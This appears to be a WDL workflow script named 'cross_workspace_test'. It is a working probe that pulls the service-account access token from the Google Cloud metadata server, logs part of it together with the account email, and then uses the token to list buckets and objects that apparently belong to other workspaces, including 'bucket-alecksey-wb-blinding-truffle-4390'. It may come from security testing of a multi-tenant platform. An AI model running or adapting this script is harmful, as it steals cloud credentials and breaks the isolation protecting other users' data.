version 1.0

workflow cross_workspace_test {
    call probe
}

task probe {
    command <<<
        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          | sed 's/.*"access_token":"\([^"]*\)".*/\1/')

        echo "=== SA Email ===" > /mnt/disks/cromwell_root/results.txt
        curl -sf -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
          >> /mnt/disks/cromwell_root/results.txt 2>&1

        echo "" >> /mnt/disks/cromwell_root/results.txt
        echo "=== Token first 30 chars ===" >> /mnt/disks/cromwell_root/results.txt
        echo "$TOKEN" | head -c 30 >> /mnt/disks/cromwell_root/results.txt

        echo "" >> /mnt/disks/cromwell_root/results.txt
        echo "=== List buckets project wb-sparkly-turnip-3673 ===" >> /mnt/disks/cromwell_root/results.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> /mnt/disks/cromwell_root/results.txt 2>&1

        echo "" >> /mnt/disks/cromwell_root/results.txt
        echo "=== List objects bucket-alecksey ===" >> /mnt/disks/cromwell_root/results.txt
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> /mnt/disks/cromwell_root/results.txt 2>&1

        echo "" >> /mnt/disks/cromwell_root/results.txt
        echo "=== Token info ===" >> /mnt/disks/cromwell_root/results.txt
        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> /mnt/disks/cromwell_root/results.txt 2>&1

        cat /mnt/disks/cromwell_root/results.txt
    >>>

    runtime {
        docker: "gcr.io/cloud-builders/curl"
        memory: "2 GB"
        cpu: 1
        disks: "local-disk 10 HDD"
    }

    output {
        String result = read_string(stdout())
    }
}
